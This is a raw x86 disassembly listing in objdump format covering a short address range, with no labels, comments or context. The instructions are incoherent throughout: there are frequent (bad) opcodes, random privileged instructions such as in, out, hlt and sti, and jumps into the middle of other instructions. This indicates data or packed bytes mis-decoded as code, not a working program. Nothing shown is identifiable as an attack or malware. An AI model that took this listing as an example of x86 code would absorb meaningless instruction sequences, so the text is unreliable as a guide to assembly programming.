  4140c7:	19 b8 08 02 0d fc    	sbb    %edi,-0x3f2fdf8(%eax)
  4140cd:	1c 40                	sbb    $0x40,%al
  4140cf:	e0 42                	loopne 0x414113
  4140d1:	16                   	push   %ss
  4140d2:	9e                   	sahf
  4140d3:	22 1a                	and    (%edx),%bl
  4140d5:	38 75 74             	cmp    %dh,0x74(%ebp)
  4140d8:	2e b3 66             	cs mov $0x66,%bl
  4140db:	a1 e0 76 61 0f       	mov    0xf6176e0,%eax
  4140e0:	34 34                	xor    $0x34,%al
  4140e2:	26 f7 2c cd c3 5e 1d 	imull  %es:0x111d5ec3(,%ecx,8)
  4140e9:	11 
  4140ea:	40                   	inc    %eax
  4140eb:	34 0c                	xor    $0xc,%al
  4140ed:	40                   	inc    %eax
  4140ee:	74 e0                	je     0x4140d0
  4140f0:	42                   	inc    %edx
  4140f1:	26 ec                	es in  (%dx),%al
  4140f3:	2f                   	das
  4140f4:	34 77                	xor    $0x77,%al
  4140f6:	bc 0a 06 a7 3b       	mov    $0x3ba7060a,%esp
  4140fb:	70 a3                	jo     0x4140a0
  4140fd:	f0 09 02             	lock or %eax,(%edx)
  414100:	37                   	aaa
  414101:	a1 e1 81 ae d3       	mov    0xd3ae81e1,%eax
  414106:	64 f7 38             	idivl  %fs:(%eax)
  414109:	73 2b                	jae    0x414136
  41410b:	70 66                	jo     0x414173
  41410d:	68 b2 44 8f 44       	push   $0x448f44b2
  414112:	36 38 c9             	ss cmp %cl,%cl
  414115:	9e                   	sahf
  414116:	6b c3 e7             	imul   $0xffffffe7,%ebx,%eax
  414119:	5b                   	pop    %ebx
  41411a:	5e                   	pop    %esi
  41411b:	1e                   	push   %ds
  41411c:	61                   	popa
  41411d:	68 a0 6c db a1       	push   $0xa1db6ca0
  414122:	7c 4e                	jl     0x414172
  414124:	00 3f                	add    %bh,(%edi)
  414126:	34 48                	xor    $0x48,%al
  414128:	86 01                	xchg   %al,(%ecx)
  41412a:	3a 10                	cmp    (%eax),%dl
  41412c:	58                   	pop    %eax
  41412d:	21 3f                	and    %edi,(%edi)
  41412f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  414130:	34 00                	xor    $0x0,%al
  414132:	19 30                	sbb    %esi,(%eax)
  414134:	46                   	inc    %esi
  414135:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  414136:	03 6f 00             	add    0x0(%edi),%ebp
  414139:	5c                   	pop    %esp
  41413a:	3e 83 0b 22          	orl    $0x22,%ds:(%ebx)
  41413e:	fe                   	(bad)
  41413f:	14 00                	adc    $0x0,%al
  414141:	4d                   	dec    %ebp
  414142:	08 40 af             	or     %al,-0x51(%eax)
  414145:	e9 91 2b 0f d5       	jmp    0xd5506cdb
  41414a:	3f                   	aas
  41414b:	be 3d 91 3a dc       	mov    $0xdc3a913d,%esi
  414150:	43                   	inc    %ebx
  414151:	b6 c1                	mov    $0xc1,%dh
  414153:	1c 0f                	sbb    $0xf,%al
  414155:	0a 06                	or     (%esi),%al
  414157:	3f                   	aas
  414158:	a0 00 f2 00 64       	mov    0x6400f200,%al
  41415d:	4a                   	dec    %edx
  41415e:	07                   	pop    %es
  41415f:	07                   	pop    %es
  414160:	01 08                	add    %ecx,(%eax)
  414162:	b0 4a                	mov    $0x4a,%al
  414164:	1e                   	push   %ds
  414165:	10 01                	adc    %al,(%ecx)
  414167:	23 5e 81             	and    -0x7f(%esi),%ebx
  41416a:	71 61                	jno    0x4141cd
  41416c:	5f                   	pop    %edi
  41416d:	2c 01                	sub    $0x1,%al
  41416f:	a3 3a 24 3c 4d       	mov    %eax,0x4d3c243a
  414174:	e7 ea                	out    %eax,$0xea
  414176:	3c fd                	cmp    $0xfd,%al
  414178:	f2 08 01             	repnz or %al,(%ecx)
  41417b:	48                   	dec    %eax
  41417c:	02 f6                	add    %dh,%dh
  41417e:	0a db                	or     %bl,%bl
  414180:	08 fe                	or     %bh,%dh
  414182:	1b 63 43             	sbb    0x43(%ebx),%esp
  414185:	86 75 91             	xchg   %dh,-0x6f(%ebp)
  414188:	b6 1f                	mov    $0x1f,%dh
  41418a:	1a 60 34             	sbb    0x34(%eax),%ah
  41418d:	24 fd                	and    $0xfd,%al
  41418f:	fb                   	sti
  414190:	94                   	xchg   %eax,%esp
  414191:	14 25                	adc    $0x25,%al
  414193:	04 f3                	add    $0xf3,%al
  414195:	87 6f 0e             	xchg   %ebp,0xe(%edi)
  414198:	c4 08                	les    (%eax),%ecx
  41419a:	f4                   	hlt
  41419b:	fe 0b                	decb   (%ebx)
  41419d:	05 01 f0 fe 1b       	add    $0x1bfef001,%eax
  4141a2:	06                   	push   %es
  4141a3:	f7 d6                	not    %esi
  4141a5:	1c b4                	sbb    $0xb4,%al
  4141a7:	07                   	pop    %es
  4141a8:	fd                   	std
  4141a9:	1d 16 1c 60 00       	sbb    $0x601c16,%eax
  4141ae:	bb b9 00 99 b0       	mov    $0xb09900b9,%ebx
  4141b3:	39 48 9a             	cmp    %ecx,-0x66(%eax)
  4141b6:	90                   	nop
  4141b7:	0b 90 2b 38 d4 ad    	or     -0x522bc7d5(%eax),%edx
  4141bd:	ab                   	stos   %eax,%es:(%edi)
  4141be:	d7                   	xlat   %ds:(%ebx)
  4141bf:	b1 ec                	mov    $0xec,%cl
  4141c1:	2a 25 be 46 1f 6b    	sub    0x6b1f46be,%ah
  4141c7:	86 26                	xchg   %ah,(%esi)
  4141c9:	67 34 ec             	addr16 xor $0xec,%al
  4141cc:	58                   	pop    %eax
  4141cd:	18 0b                	sbb    %cl,(%ebx)
  4141cf:	8f                   	(bad)
  4141d0:	60                   	pusha
  4141d1:	ec                   	in     (%dx),%al
  4141d2:	6d                   	insl   (%dx),%es:(%edi)
  4141d3:	35 16 1c 09 01       	xor    $0x1091c16,%eax
  4141d8:	34 15                	xor    $0x15,%al
  4141da:	07                   	pop    %es
  4141db:	c1 84 34 1d a3 90 38 	roll   $0x20,0x3890a31d(%esp,%esi,1)
  4141e2:	20 
  4141e3:	d3 74 93 8c          	shll   %cl,-0x74(%ebx,%edx,4)
  4141e7:	1b 05 48 03 68 38    	sbb    0x38680348,%eax
  4141ed:	1e                   	push   %ds
  4141ee:	19 89 0f a7 1c 77    	sbb    %ecx,0x771ca70f(%ecx)
  4141f4:	04 f0                	add    $0xf0,%al
  4141f6:	fe 01                	incb   (%ecx)
  4141f8:	20 b2 91 6b 01 8f    	and    %dh,-0x70fe946f(%edx)
  4141fe:	37                   	aaa
  4141ff:	f4                   	hlt
  414200:	70 06                	jo     0x414208
  414202:	7c 36                	jl     0x41423a
  414204:	85 0a                	test   %ecx,(%edx)
  414206:	31 70 81             	xor    %esi,-0x7f(%eax)
  414209:	14 9c                	adc    $0x9c,%al
  41420b:	01 9b c3 e3 9c 94    	add    %ebx,-0x6b631c3d(%ebx)
  414211:	60                   	pusha
  414212:	7e 60                	jle    0x414274
  414214:	4a                   	dec    %edx
  414215:	74 f4                	je     0x41420b
  414217:	92                   	xchg   %eax,%edx
  414218:	1a 1f                	sbb    (%edi),%bl
  41421a:	23 b3 50 6b 14 84    	and    -0x7beb94b0(%ebx),%esi
  414220:	83 5c 0a 32 f4       	sbbl   $0xfffffff4,0x32(%edx,%ecx,1)
  414225:	08 ad 63 0c f1 fd    	or     %ch,-0x20ef39d(%ebp)
  41422b:	69 50 12 75 ec a2 d1 	imul   $0xd1a2ec75,0x12(%eax),%edx
  414232:	30 63 a6             	xor    %ah,-0x5a(%ebx)
  414235:	fc                   	cld
  414236:	22 7d 04             	and    0x4(%ebp),%bh
  414239:	78 d6                	js     0x414211
  41423b:	d0 48 c8             	rorb   $1,-0x38(%eax)
  41423e:	0e                   	push   %cs
  41423f:	7e 78                	jle    0x4142b9
  414241:	f7 fc                	idiv   %esp
  414243:	75 af                	jne    0x4141f4
  414245:	ba 0f 35 e9 31       	mov    $0x31e9350f,%edx
  41424a:	00 12                	add    %dl,(%edx)
  41424c:	22 28                	and    (%eax),%ch
  41424e:	6a 4e                	push   $0x4e
  414250:	c6                   	(bad)
  414251:	66 0b 31             	or     (%ecx),%si
  414254:	60                   	pusha
  414255:	34 5c                	xor    $0x5c,%al
  414257:	10 02                	adc    %al,(%edx)
  414259:	63 93 6c 4b 3c 02    	arpl   %edx,0x23c4b6c(%ebx)
  41425f:	77 81                	ja     0x4141e2
  414261:	1b 16                	sbb    (%esi),%edx
  414263:	39 90 93 05 03 03    	cmp    %edx,0x3030593(%eax)
  414269:	72 5c                	jb     0x4142c7
  41426b:	33 21                	xor    (%ecx),%esp
  41426d:	03 03                	add    (%ebx),%eax
  41426f:	03 13                	add    (%ebx),%edx
  414271:	49                   	dec    %ecx
  414272:	5d                   	pop    %ebp
  414273:	d3 4c f6 97          	rorl   %cl,-0x69(%esi,%esi,8)
  414277:	18 78 02             	sbb    %bh,0x2(%eax)
  41427a:	16                   	push   %ss
  41427b:	51                   	push   %ecx
  41427c:	43                   	inc    %ebx
  41427d:	62 4d af             	bound  %ecx,-0x51(%ebp)
  414280:	53                   	push   %ebx
  414281:	be 7d 16 08 53       	mov    $0x5308167d,%esi
  414286:	24 3f                	and    $0x3f,%al
  414288:	12 9c f0 4f 40 00 20 	adc    0x2000404f(%eax,%esi,8),%bl
  41428f:	01 30                	add    %esi,(%eax)
  414291:	e0 c5                	loopne 0x414258
  414293:	ca 80 a7             	lret   $0xa780
  414296:	ab                   	stos   %eax,%es:(%edi)
  414297:	00 31                	add    %dh,(%ecx)
  414299:	1a 32                	sbb    (%edx),%dh
  41429b:	07                   	pop    %es
  41429c:	4c                   	dec    %esp
  41429d:	cb                   	lret
  41429e:	f1                   	int1
  41429f:	d5 80                	aad    $0x80
  4142a1:	9b                   	fwait
  4142a2:	32 61 5d             	xor    0x5d(%ecx),%ah
  4142a5:	34 83                	xor    $0x83,%al
  4142a7:	06                   	push   %es
  4142a8:	a0 59 88 3c 2a       	mov    0x2a3c8859,%al
  4142ad:	6c                   	insb   (%dx),%es:(%edi)
  4142ae:	30 4c 5c be          	xor    %cl,-0x42(%esp,%ebx,2)
  4142b2:	78 0d                	js     0x4142c1
  4142b4:	39 bb 63 28 74 3d    	cmp    %edi,0x3d742863(%ebx)
  4142ba:	37                   	aaa
  4142bb:	90                   	nop
  4142bc:	c1 b6 a5 ab 3a 02 71 	shll   $0x71,0x23aaba5(%esi)
  4142c3:	39 07                	cmp    %eax,(%edi)
  4142c5:	a1 cd bd 81 71       	mov    0x7181bdcd,%eax
  4142ca:	36 10 e4             	ss adc %ah,%ah
  4142cd:	5e                   	pop    %esi
  4142ce:	f4                   	hlt
  4142cf:	d6                   	salc
  4142d0:	2c bc                	sub    $0xbc,%al
  4142d2:	98                   	cwtl
  4142d3:	2c 44                	sub    $0x44,%al
  4142d5:	17                   	pop    %ss
  4142d6:	09 46 a5             	or     %eax,-0x5b(%esi)
  4142d9:	7b f5                	jnp    0x4142d0
  4142db:	08 b8 39 36 aa 04    	or     %bh,0x4aa3639(%eax)
  4142e1:	2c 1b                	sub    $0x1b,%al
  4142e3:	da 3d 9d d1 5d 07    	fidivrl 0x75dd19d
  4142e9:	60                   	pusha
  4142ea:	31 74 14 2c          	xor    %esi,0x2c(%esp,%edx,1)
  4142ee:	fc                   	cld
  4142ef:	4a                   	dec    %edx
  4142f0:	3e 20 16             	and    %dl,%ds:(%esi)
  4142f3:	cc                   	int3
  4142f4:	03 6f 47             	add    0x47(%edi),%ebp
  4142f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4142f8:	3c e6                	cmp    $0xe6,%al
  4142fa:	62 6e f9             	bound  %ebp,-0x7(%esi)
  4142fd:	0d 74 58 6e 3f       	or     $0x3f6e5874,%eax
  414302:	24 57                	and    $0x57,%al
  414304:	58                   	pop    %eax
  414305:	a3 60 5d 23 13       	mov    %eax,0x13235d60
  41430a:	10 1b                	adc    %bl,(%ebx)
  41430c:	73 ae                	jae    0x4142bc
  41430e:	34 c0                	xor    $0xc0,%al
  414310:	ae                   	scas   %es:(%edi),%al
  414311:	c3                   	ret
  414312:	0c 57                	or     $0x57,%al
  414314:	2f                   	das
  414315:	0d 48 f0 26 81       	or     $0x8126f048,%eax
  41431a:	a1 5d 82 e0 d0       	mov    0xd0e0825d,%eax
  41431f:	00 f7                	add    %dh,%bh
  414321:	1c 1c                	sbb    $0x1c,%al
  414323:	01 0c 0c             	add    %ecx,(%esp,%ecx,1)
  414326:	2f                   	das
  414327:	43                   	inc    %ebx
  414328:	83 84 91 63 50 63 17 	addl   $0x2,0x17635063(%ecx,%edx,4)
  41432f:	02 
  414330:	e1 d1                	loope  0x414303
  414332:	ab                   	stos   %eax,%es:(%edi)
  414333:	1b 27                	sbb    (%edi),%esp
  414335:	7b 0c                	jnp    0x414343
  414337:	70 40                	jo     0x414379
  414339:	68 2c 13 16 0b       	push   $0xb16132c
  41433e:	2f                   	das
  41433f:	74 7b                	je     0x4143bc
  414341:	b5 09                	mov    $0x9,%ch
  414343:	2e 0b 11             	or     %cs:(%ecx),%edx
  414346:	fd                   	std
  414347:	07                   	pop    %es
  414348:	1c 22                	sbb    $0x22,%al
  41434a:	dd 58 89             	fstpl  -0x77(%eax)
  41434d:	da 1f                	ficompl (%edi)
  41434f:	1e                   	push   %ds
  414350:	59                   	pop    %ecx
  414351:	21 1a                	and    %ebx,(%edx)
  414353:	23 19                	and    (%ecx),%ebx
  414355:	12 70 46             	adc    0x46(%eax),%dh
  414358:	34 7d                	xor    $0x7d,%al
  41435a:	07                   	pop    %es
  41435b:	64 80 60 63 5c       	andb   $0x5c,%fs:0x63(%eax)
  414360:	6a 82                	push   $0xffffff82
  414362:	0e                   	push   %cs
  414363:	38 77 17             	cmp    %dh,0x17(%edi)
  414366:	13 5f 08             	adc    0x8(%edi),%ebx
  414369:	40                   	inc    %eax
  41436a:	db 1c 61             	fistpl (%ecx,%eiz,2)
  41436d:	41                   	inc    %ecx
  41436e:	6b 15 35 12 c1 f3 0c 	imul   $0xc,0xf3c11235,%edx
  414375:	d2 54 10 3c          	rclb   %cl,0x3c(%eax,%edx,1)
  414379:	14 68                	adc    $0x68,%al
  41437b:	6a e8                	push   $0xffffffe8
  41437d:	15 32 94 13 5d       	adc    $0x5d139432,%eax
  414382:	16                   	push   %ss
  414383:	06                   	push   %es
  414384:	c1 8e b9 91 fd 0d 22 	rorl   $0x22,0xdfd91b9(%esi)
  41438b:	73 1c                	jae    0x4143a9
  41438d:	94                   	xchg   %eax,%esp
  41438e:	12 d4                	adc    %ah,%dl
  414390:	4a                   	dec    %edx
  414391:	b3 10                	mov    $0x10,%bl
  414393:	e1 12                	loope  0x4143a7
  414395:	4c                   	dec    %esp
  414396:	a3 34 cb d6 06       	mov    %eax,0x6d6cb34
  41439b:	36 14 30             	ss adc $0x30,%al
  41439e:	3c 2c                	cmp    $0x2c,%al
  4143a0:	4c                   	dec    %esp
  4143a1:	f9                   	stc
  4143a2:	bd 36 b2 1c 0c       	mov    $0xc1cb236,%ebp
  4143a7:	67 ac                	lods   %ds:(%si),%al
  4143a9:	7e fc                	jle    0x4143a7
  4143ab:	fe                   	(bad)
  4143ac:	5a                   	pop    %edx
  4143ad:	6b ae de b2 79 20 19 	imul   $0x19,0x2079b2de(%esi),%ebp
  4143b4:	10 39                	adc    %bh,(%ecx)
  4143b6:	b2 18                	mov    $0x18,%dl
  4143b8:	94                   	xchg   %eax,%esp
  4143b9:	c6                   	(bad)
  4143ba:	dd 38                	fnstsw (%eax)
  4143bc:	15 ae db 80 17       	adc    $0x1780dbae,%eax
  4143c1:	15 98 94 37 16       	adc    $0x16379498,%eax
  4143c6:	94                   	xchg   %eax,%esp
  4143c7:	7f f5                	jg     0x4143be
  4143c9:	bb ec 74 e4 fe       	mov    $0xfee474ec,%ebx
  4143ce:	37                   	aaa
  4143cf:	00 7f 80             	add    %bh,-0x80(%edi)
  4143d2:	70 8f                	jo     0x414363
  4143d4:	98                   	cwtl
  4143d5:	00 14 c0             	add    %dl,(%eax,%eax,8)
  4143d8:	90                   	nop
  4143d9:	4c                   	dec    %esp
  4143da:	c8 01 2c 14          	enter  $0x2c01,$0x14
  4143de:	2c 6e                	sub    $0x6e,%al
  4143e0:	b0 60                	mov    $0x60,%al
  4143e2:	61                   	popa
  4143e3:	6b 0b 60             	imul   $0x60,(%ebx),%ecx
  4143e6:	03 74 39 03          	add    0x3(%ecx,%edi,1),%esi
  4143ea:	9a 5c 4c 6f fc 1b 17 	lcall  $0x171b,$0xfc6f4c5c
  4143f1:	65 d9 3e             	fnstcw %gs:(%esi)
  4143f4:	b0 2c                	mov    $0x2c,%al
  4143f6:	58                   	pop    %eax
  4143f7:	68 1b 18 08 5c       	push   $0x5c08181b
  4143fc:	5c                   	pop    %esp
  4143fd:	96                   	xchg   %eax,%esi
  4143fe:	c7                   	(bad)
  4143ff:	58                   	pop    %eax
  414400:	96                   	xchg   %eax,%esi
  414401:	19 60 60             	sbb    %esp,0x60(%eax)
  414404:	1b 80 59 64 04 d0    	sbb    -0x2ffb9ba7(%eax),%eax
  41440a:	08 77 e9             	or     %dh,-0x17(%edi)
  41440d:	44                   	inc    %esp
  41440e:	59                   	pop    %ecx
  41440f:	0a 1a                	or     (%edx),%bl
  414411:	69 28 72 c8 64 ee    	imul   $0xee64c872,(%eax),%ebp
  414417:	48                   	dec    %eax
  414418:	2f                   	das
  414419:	38 1b                	cmp    %bl,(%ebx)
  41441b:	1c 85                	sbb    $0x85,%al
  41441d:	1c 72                	sbb    $0x72,%al
  41441f:	01 1d 1e c9 21 87    	add    %ebx,0x8721c91e
  414425:	0c 17                	or     $0x17,%al
  414427:	1f                   	pop    %ds
  414428:	20 61 13             	and    %ah,0x13(%ecx)
  41442b:	c9                   	leave
  41442c:	54                   	push   %esp
  41442d:	02 21                	add    (%ecx),%ah
  41442f:	68 ec a3 4b c8       	push   $0xc84ba3ec
  414434:	22 27                	and    (%edi),%ah
  414436:	23 58 04             	and    0x4(%eax),%ebx
  414439:	27                   	daa
  41443a:	02 f9                	add    %cl,%bh
  41443c:	65 45                	gs inc %ebp
  41443e:	bf 24 00 48 01       	mov    $0x1480024,%edi
  414443:	03 42 87             	add    -0x79(%edx),%eax
  414446:	90                   	nop
  414447:	8f                   	(bad)
  414448:	58                   	pop    %eax
  414449:	bf 0d d1 d5 09       	mov    $0x9d5d10d,%edi
  41444e:	c3                   	ret
  41444f:	f5                   	cmc
  414450:	d0 b4 cd 58 45 81 40 	shlb   $1,0x40814558(%ebp,%ecx,8)
  414457:	9d                   	popf
  414458:	9b                   	fwait
  414459:	e1 82                	loope  0x4143dd
  41445b:	7c 64                	jl     0x4144c1
  41445d:	55                   	push   %ebp
  41445e:	0d 34 b7 c9 64       	or     $0x64c9b734,%eax
  414463:	a8 2a                	test   $0x2a,%al
  414465:	23 08                	and    (%eax),%ecx
  414467:	e1 48                	loope  0x4144b1
  414469:	5b                   	pop    %ebx
  41446a:	73 77                	jae    0x4144e3
  41446c:	2a c0                	sub    %al,%al
  41446e:	bd 5c ff 60 1a       	mov    $0x1a60ff5c,%ebp
  414473:	23 35 6c 30 87 ab    	and    0xab87306c,%esi
  414479:	48                   	dec    %eax
  41447a:	55                   	push   %ebp
  41447b:	da fe                	(bad)
  41447d:	0b ce                	or     %esi,%ecx
  41447f:	ba a5 09 39 0c       	mov    $0xc3909a5,%edx
  414484:	44                   	inc    %esp
  414485:	41                   	inc    %ecx
  414486:	0d a8 31 83 e4       	or     $0xe48331a8,%eax
  41448b:	48                   	dec    %eax
  41448c:	d6                   	salc
  41448d:	d6                   	salc
  41448e:	f9                   	stc
  41448f:	fd                   	std
  414490:	13 1c b9             	adc    (%ecx,%edi,4),%ebx
  414493:	32 85 b9 c0 75 7f    	xor    0x7f75c0b9(%ebp),%al
  414499:	3e 36 4f             	ds ss dec %edi
  41449c:	dd 0a                	fisttpll (%edx)
  41449e:	db 69 00             	fldt   0x0(%ecx)
  4144a1:	42                   	inc    %edx
  4144a2:	a3 49 0e 95 58       	mov    %eax,0x58950e49
  4144a7:	33 3c 69             	xor    (%ecx,%ebp,2),%edi
  4144aa:	2a a0 08 0a 0f 2f    	sub    0x2f0f0a08(%eax),%ah
  4144b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4144b1:	76 38                	jbe    0x4144eb
  4144b3:	f6 25 41 33 ed 31    	mulb   0x31ed3341
  4144b9:	40                   	inc    %eax
  4144ba:	94                   	xchg   %eax,%esp
  4144bb:	07                   	pop    %es
  4144bc:	bd cd 99 ca 3e       	mov    $0x3eca99cd,%ebp
  4144c1:	ce                   	into
  4144c2:	3b df                	cmp    %edi,%ebx
  4144c4:	5c                   	pop    %esp
  4144c5:	3f                   	aas
  4144c6:	8b 41 9e             	mov    -0x62(%ecx),%eax
  4144c9:	cd e6                	int    $0xe6
  4144cb:	33 10                	xor    (%eax),%edx
  4144cd:	08 40 4d             	or     %al,0x4d(%eax)
  4144d0:	28 a9 5d c2 7b 3c    	sub    %ch,0x3c7bc25d(%ecx)
  4144d6:	01 17                	add    %edx,(%edi)
  4144d8:	25 4c 80 53 07       	and    $0x753804c,%eax
  4144dd:	9f                   	lahf
  4144de:	7f b5                	jg     0x414495
  4144e0:	48                   	dec    %eax
  4144e1:	8c 34 40             	mov    %?,(%eax,%eax,2)
  4144e4:	23 03                	and    (%ebx),%eax
  4144e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4144e7:	4c                   	dec    %esp
  4144e8:	38 01                	cmp    %al,(%ecx)
  4144ea:	4c                   	dec    %esp
  4144eb:	35 be 43 27 95       	xor    $0x952743be,%eax
  4144f0:	64 99                	fs cltd
  4144f2:	07                   	pop    %es
  4144f3:	26 bb 98 04 6c 50    	es mov $0x506c0498,%ebx
  4144f9:	60                   	pusha
  4144fa:	a0 3d 6a c8 9a       	mov    0x9ac86a3d,%al
  4144ff:	e8 16 81 42 32       	call   0x3283c61a
  414504:	d2 d0                	rcl    %cl,%al
  414506:	59                   	pop    %ecx
  414507:	51                   	push   %ecx
  414508:	60                   	pusha
  414509:	5b                   	pop    %ebx
  41450a:	5c                   	pop    %esp
  41450b:	60                   	pusha
  41450c:	be 0d b4 13 7d       	mov    $0x7d13b40d,%esi
  414511:	01 52 aa             	add    %edx,-0x56(%edx)
  414514:	71 58                	jno    0x41456e
  414516:	15 58 9c c0 f6       	adc    $0xf6c09c58,%eax
  41451b:	1d 73 15 23 06       	sbb    $0x6231573,%eax
  414520:	28 cd                	sub    %cl,%ch
  414522:	17                   	pop    %ss
  414523:	59                   	pop    %ecx
  414524:	a0 a3 f2 48 ed       	mov    0xed48f2a3,%al
  414529:	38 c7                	cmp    %al,%bh
  41452b:	18 cc                	sbb    %cl,%ah
  41452d:	b6 9d                	mov    $0x9d,%dh
  41452f:	e6 38                	out    %al,$0x38
  414531:	68 16 38 81 4f       	push   $0x4f813816
  414536:	c2 1e 48             	ret    $0x481e
  414539:	19 08                	sbb    %ecx,(%eax)
  41453b:	64 59                	fs pop %ecx
  41453d:	5c                   	pop    %esp
  41453e:	8e 79 b6             	mov    -0x4a(%ecx),%?
  414541:	01 99 30 34 96 68    	add    %ebx,0x68963430(%ecx)
  414547:	30 10                	xor    %dl,(%eax)
  414549:	13 36                	adc    (%esi),%esi
  41454b:	c6                   	(bad)
  41454c:	ae                   	scas   %es:(%edi),%al
  41454d:	34 9a                	xor    $0x9a,%al
  41454f:	1e                   	push   %ds
  414550:	9e                   	sahf
  414551:	41                   	inc    %ecx
  414552:	ce                   	into
  414553:	a0 f6 02 68 17       	mov    0x176802f6,%al
  414558:	60                   	pusha
  414559:	45                   	inc    %ebp
  41455a:	8a 65 48             	mov    0x48(%ebp),%ah
  41455d:	68 0f c6 d8 53       	push   $0x53d8c60f
  414562:	1f                   	pop    %ds
  414563:	fd                   	std
  414564:	da 02                	fiaddl (%edx)
  414566:	1e                   	push   %ds
  414567:	7b 23                	jnp    0x41458c
  414569:	3c 9e                	cmp    $0x9e,%al
  41456b:	2c 8e                	sub    $0x8e,%al
  41456d:	d5 00                	aad    $0x0
  41456f:	c2 44 30             	ret    $0x3044
  414572:	1d 79 e7 5c 03       	sbb    $0x35ce779,%eax
  414577:	0b a5 6c 09 fe 5d    	or     0x5dfe096c(%ebp),%esp
  41457d:	55                   	push   %ebp
  41457e:	01 d2                	add    %edx,%edx
  414580:	c1 47 87 b8          	roll   $0xb8,-0x79(%edi)
  414584:	5f                   	pop    %edi
  414585:	0c 47                	or     $0x47,%al
  414587:	84 e8                	test   %ch,%al
  414589:	21 84 0c 4c d3 74 42 	and    %eax,0x4274d34c(%esp,%ecx,1)
  414590:	cd 43                	int    $0x43
  414592:	48                   	dec    %eax
  414593:	17                   	pop    %ss
  414594:	d7                   	xlat   %ds:(%ebx)
  414595:	34 48                	xor    $0x48,%al
  414597:	37                   	aaa
  414598:	1b 48 70             	sbb    0x70(%eax),%ecx
  41459b:	0b 09                	or     (%ecx),%ecx
  41459d:	2a 01                	sub    (%ecx),%al
  41459f:	63 d5                	arpl   %edx,%ebp
  4145a1:	24 cb                	and    $0xcb,%al
  4145a3:	61                   	popa
  4145a4:	c5 fb 5c 5c 91 3c    	vsubsd 0x3c(%ecx,%edx,4),%xmm0,%xmm3
  4145aa:	27                   	daa
  4145ab:	cb                   	lret
  4145ac:	58                   	pop    %eax
  4145ad:	5c                   	pop    %esp
  4145ae:	58                   	pop    %eax
  4145af:	5c                   	pop    %esp
  4145b0:	24 59                	and    $0x59,%al
  4145b2:	2e e4 1b             	cs in  $0x1b,%al
  4145b5:	05 58 58 ed 42       	add    $0x42ed5858,%eax
  4145ba:	6a 42                	push   $0x42
  4145bc:	42                   	inc    %edx
  4145bd:	62 58 a4             	bound  %ebx,-0x5c(%eax)
  4145c0:	c3                   	ret
  4145c1:	6b 4d e7 19          	imul   $0x19,-0x19(%ebp),%ecx
  4145c5:	f5                   	cmc
  4145c6:	ff a8 0d 44 07 e5    	ljmp   *-0x1af8bbf3(%eax)
  4145cc:	d8 f2                	fdiv   %st(2),%st
  4145ce:	6c                   	insb   (%dx),%es:(%edi)
  4145cf:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4145d0:	a3 30 ff 64 43       	mov    %eax,0x4364ff30
  4145d5:	2d 21 76 3a 8b       	sub    $0x8b3a7621,%eax
  4145da:	d1 0e                	rorl   $1,(%esi)
  4145dc:	a1 d6 ff 06 41       	mov    0x4106ffd6,%eax
  4145e1:	6a 36                	push   $0x36
  4145e3:	a9 d6 99 5b d9       	test   $0xd95b99d6,%eax
  4145e8:	61                   	popa
  4145e9:	d8 20                	fsubs  (%eax)
  4145eb:	ac                   	lods   %ds:(%esi),%al
  4145ec:	e3 ac                	jecxz  0x41459a
  4145ee:	73 49                	jae    0x414639
  4145f0:	70 b4                	jo     0x4145a6
  4145f2:	e0 43                	loopne 0x414637
  4145f4:	6c                   	insb   (%dx),%es:(%edi)
  4145f5:	57                   	push   %edi
  4145f6:	c0 12 93             	rclb   $0x93,(%edx)
  4145f9:	b4 89                	mov    $0x89,%ah
  4145fb:	68 50 6c 78 55       	push   $0x55786c50
  414600:	12 c9                	adc    %cl,%cl
  414602:	82 40 b3 2f          	addb   $0x2f,-0x4d(%eax)
  414606:	33 25 15 b0 f6 38    	xor    0x38f6b015,%esp
  41460c:	cb                   	lret
  41460d:	e6 1c                	out    %al,$0x1c
  41460f:	20 44 10 38          	and    %al,0x38(%eax,%edx,1)
  414613:	0f 25                	(bad)
  414615:	0b 17                	or     (%edi),%edx
  414617:	b5 0d                	mov    $0xd,%ch
  414619:	e2 72                	loop   0x41468d
  41461b:	ac                   	lods   %ds:(%esi),%al
  41461c:	9e                   	sahf
  41461d:	58                   	pop    %eax
  41461e:	e2 dc                	loop   0x4145fc
  414620:	85 76 26             	test   %esi,0x26(%esi)
  414623:	78 91                	js     0x4145b6
  414625:	32 18                	xor    (%eax),%bl
  414627:	dd f6                	(bad)
  414629:	1c 7c                	sbb    $0x7c,%al
  41462b:	18 17                	sbb    %dl,(%edi)
  41462d:	0c 4a                	or     $0x4a,%al
  41462f:	34 78                	xor    $0x78,%al
  414631:	09 14 42             	or     %edx,(%edx,%eax,2)
  414634:	08 28                	or     %ch,(%eax)
  414636:	fb                   	sti
  414637:	08 24 2d d4 0c f1 94 	or     %ah,-0x6b0ef32c(,%ebp,1)
  41463e:	b7 0d                	mov    $0xd,%bh
  414640:	07                   	pop    %es
  414641:	02 43 e3             	add    -0x1d(%ebx),%al
  414644:	37                   	aaa
  414645:	5c                   	pop    %esp
  414646:	df 44 40 26          	filds  0x26(%eax,%eax,2)
  41464a:	84 20                	test   %ah,(%eax)
  41464c:	d7                   	xlat   %ds:(%ebx)
  41464d:	08 90 e6 92 e6 50    	or     %dl,0x50e692e6(%eax)
  414653:	50                   	push   %eax
  414654:	4c                   	dec    %esp
  414655:	50                   	push   %eax
  414656:	9a ab 64 64 4c 50 4c 	lcall  $0x4c50,$0x4c6464ab
  41465d:	4c                   	dec    %esp
  41465e:	41                   	inc    %ecx
  41465f:	26 19 4a 73          	sbb    %ecx,%es:0x73(%edx)
  414663:	3c e7                	cmp    $0xe7,%al
  414665:	00 6b 93             	add    %ch,-0x6d(%ebx)
  414668:	3c 06                	cmp    $0x6,%al
  41466a:	18 60 78             	sbb    %ah,0x78(%eax)
  41466d:	39 6c 09 f0          	cmp    %ebp,-0x10(%ecx,%ecx,1)
  414671:	09 5c 50 04          	or     %ebx,0x4(%eax,%edx,2)
  414675:	54                   	push   %esp
  414676:	12 42 f7             	adc    -0x9(%edx),%al
  414679:	74 e3                	je     0x41465e
  41467b:	2d 38 bb 38 fb       	sub    $0xfb38bb38,%eax
  414680:	cc                   	int3
  414681:	ce                   	into
  414682:	20 cc                	and    %cl,%ah
